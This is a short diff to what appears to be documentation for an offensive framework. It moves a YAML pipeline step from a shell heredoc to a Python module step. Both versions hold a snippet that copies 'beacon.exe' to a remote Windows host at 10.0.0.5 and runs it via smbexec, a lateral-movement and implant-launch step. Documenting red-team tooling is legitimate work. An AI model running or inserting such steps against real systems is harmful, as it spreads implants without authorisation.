@@ -20,15 +20,15 @@ print(out)
 ```yaml
 steps:
   - name: copy and run
-    run: |
-      python - <<'PY'
-      from ofx.api import lateral
-      out = lateral.copy_and_exec(
-          "10.0.0.5",
-          "./beacon.exe",
-          "C:\\Temp\\b.exe",
-          method="smbexec",
-      )
-      print(out)
-      PY
+    module: python
+    with:
+      script: |
+        from ofx.api import lateral
+        out = lateral.copy_and_exec(
+            "10.0.0.5",
+            "./beacon.exe",
+            "C:\\Temp\\b.exe",
+            method="smbexec",
+        )
+        print(out)
 ```
